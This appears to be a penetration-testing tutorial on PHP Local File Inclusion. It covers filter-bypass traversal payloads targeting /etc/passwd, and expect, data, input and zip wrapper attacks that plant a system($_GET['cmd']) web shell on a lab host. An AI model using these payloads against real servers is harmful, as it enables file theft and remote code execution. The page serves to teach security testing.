# Local File Inclusion \(LFI\)

## Local File Inclusion

Local File Inclusion is a vulnerability that allows us to include files that are on the target server. Server-side languages such as PHP or JSP can dynamically include external scripts, reducing the script's overall size and simplifying the code. Attackers can include both local and remote files if this inclusion logic isn't checked, which could lead to source code leakage, sensitive data exposure, and code execution under some circumstances.

## LFI Examples

### LFI with Path Traversal

Developers may specify absolute paths when including files.

```php
include("./languages/" . $_GET['language']);
```

The statement above includes the files present in the languages folder. 

**Another Example**

Input from parameters can even be used as part of filenames. For example:

```php
include("lang_" . $_GET['language']);
```

In this scenario, input such as `../../../../../etc/passwd` will result in the final string to be `lang_../../../../../etc/passwd`, which is invalid. Prefixing a `/` before the payload will bypass the filename and traverse directories instead.

### LFI with Blacklisting

Scripts can employ search and replace techniques to avoid path traversals. 

```php
$language = str_replace('../', '', $_GET['language']);
```

It is not removing `../` recursively, which means removing the occurrences from the string a single time. If removing `../`, creates a new instance of `../`, the new instance will not be removed. For example, both `..././` and `....//` would become `../` after the replace function.

```php
$lfi = "....././/..../..//filename";
while( substr_count($lfi, '../', 0)) {
 $lfi = str_replace('../', '', $lfi);
};
```

Of course, the easiest method to fix this is to use `basename($ GET['language'])`, however this could damage your application if it goes inside a directory. While the following example works, it's ideal to try to find a native function to do the activity in your language or framework. Use a bash terminal and go into your home directly \(cd ~ / cd $HOME\) and run the command `cat .?/.*/.?/etc/passwd`. You'll see Bash allows for for the `?` and `*` wildcards to be used as a `.`.  We can use those symbols with directory traversal to achieve an LFI.

### **Bypass with URL Encoding**

String-based detection in PHP versions 5.3.4 and before could be circumvented by URL encoding the payload. The characters `../` can be URL encoded as `%2e%2e%2f` to avoid the filter.

The payload could be:`%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd`

### LFI with Appended Extension

Scripts can manually append a `.php` or any other required extension before including the file, which serves as mitigation against the inclusion of arbitrary files.

```php
include($_GET['language'] . ".php");
```

## Bypass Extensions Filters

%00 = Null bytes terminate the string, this trick can be used to bypass file extensions added server-side and are useful for file inclusions because it prevents the file extension from being considered as part of the string. 

? = The question mark, marks anything added to the URL server-side as part of the query string. It can also use be used as an "alternative" to the null bytes trick.

## Wrappers

{% embed url="https://www.php.net/manual/en/wrappers.php" %}

### Expect Wrapper

The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper in PHP helps in interaction with process streams. This extension is disabled by default but can prove very useful if enabled. For example, the following URL will return the output of the id command.

* `http://victim.vmx/index.php?language=expect://id`

### Data Wrapper

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, even PHP code. It's possible to use this only if the `allow_url_include` setting is enabled in the PHP configuration. This can be found in the file `/etc/php/X.Y/apache2/php.ini` for Apache and in `/etc/php/X.Y/fpm/php.ini` for php-fpm used by Nginx, where `X.Y` is your install PHP version.

First, base64 encode a PHP web shell.

```text
wixnic@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
```

Then include it using the data wrapper as shown below.

* `http://victim.vmx/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id`

### Input Wrapper

The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute code. In PHP it also needs the `allow_url_include` setting enabled. The following curl command sends a POST request with a system command and then includes it using `php://input`, which gets executed by the page.

```text
wixnic@htb[/htb]$ curl -s -X POST --data "<?php system('id'); ?>" "http://victim.vmx/index.php?language=php://input" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Zip Wrapper

The [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper can prove useful in combination with file uploads. If the website enables arbitrary file uploads, an attacker might upload a malicious zip file containing PHP code. This wrapper isn't enabled by default, however, it can be activated with the command below.

```text
wixnic@htb[/htb]$ apt install phpX.Y-zip
```

Follow the steps below to create a malicious archive.

```text
wixnic@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' > exec.php
wixnic@htb[/htb]$ zip malicious.zip exec.php
wixnic@htb[/htb]$ rm exec.php
```

Next, copy `malicious.zip` to the web root to simulate the upload. The files in the zip archive can be referenced using the `#` symbol, which is URL-encoded in the request as `%23`.

